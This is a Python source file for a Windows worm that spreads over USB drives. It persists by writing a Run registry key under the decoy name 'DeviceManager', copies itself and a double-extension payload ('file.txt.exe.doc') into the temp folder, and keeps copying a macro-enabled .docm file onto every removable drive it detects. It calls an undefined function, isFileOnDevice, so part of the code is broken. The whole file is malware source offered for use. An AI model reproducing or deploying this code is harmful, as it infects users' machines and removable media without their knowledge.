import os
from time import sleep
from shutil import copyfile
import _winreg
import sys
import subprocess

SPREAD_FILE = "file.txt.exe.doc" #FILE TO COPY TO USB (MUST BE IN SAME DIRECTORY)
INFECTED_FILE_NAME = "copied_file_on_usb.docm" # NEW FILE ON USB

TIME_TO_CHECK_PERSISTENCE = 60
TIME_TO_COPY_ON_USB = 1

SERVICE_NAME= "DeviceManager"

if getattr(sys, 'frozen', False):
    EXECUTABLE_PATH = sys.executable
elif __file__:
    EXECUTABLE_PATH = __file__
else:
    EXECUTABLE_PATH = ''

EXECUTABLE_NAME = os.path.basename(EXECUTABLE_PATH)
EXECUTABLE_PATH = os.path.dirname(os.path.realpath(__file__))

def locate_usb():
    import win32file
    drive_list = []
    drivebits=win32file.GetLogicalDrives()
    for d in range(1,26):
        mask=1 << d
        if drivebits & mask:
            # here if the drive is at least there
            drname='%c:\\' % chr(ord('A')+d)
            t=win32file.GetDriveType(drname)
            if t == win32file.DRIVE_REMOVABLE:
                drive_list.append(drname)
    return drive_list

def install():
	if not is_installed_in_reg():
		stdin, stdout, stderr = os.popen3("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, os.environ["TEMP"] + "\\" + EXECUTABLE_NAME))
	if not is_in_tmp():
		copyfile(os.path.dirname(os.path.realpath(__file__)) + "\\" + EXECUTABLE_NAME, os.environ["TEMP"] + "\\" + EXECUTABLE_NAME)
	if not is_file_in_tmp():
		copyfile(os.path.dirname(os.path.realpath(__file__)) + "\\" + SPREAD_FILE, os.environ["TEMP"] + "\\" + SPREAD_FILE)

def is_installed_in_reg():
    output = os.popen(
        "reg query HKCU\Software\Microsoft\Windows\Currentversion\Run /f %s" % SERVICE_NAME)
    if SERVICE_NAME in output.read():
        return True
    else:
		return False
def is_in_tmp():
	if os.path.isfile(os.environ["TEMP"] + "/" + EXECUTABLE_NAME):
		return True
	else:
		return False
def is_file_in_tmp():
	if os.path.isfile(os.environ["TEMP"] + "/" + SPREAD_FILE):
		return True
	else:
		return False

def main():
	while True:
		try:
			devices = locate_usb()
			if len(devices) > 0:
				for device in devices:
					if not isFileOnDevice(device):
						sleep(0.5) # puffer for pc
						copyfile(SPREAD_FILE, device + INFECTED_FILE_NAME)
		except:
			pass
		sleep(TIME_TO_COPY_ON_USB)
def persistence():
		while True:
			install() # persistence
			sleep(TIME_TO_CHECK_PERSISTENCE)

from threading import Thread

if __name__ == "__main__":
	thread1 = Thread(target = main)
	thread2 = Thread(target = persistence)
	thread1.start()
	thread2.start()
	thread1.join()
	thread2.join()
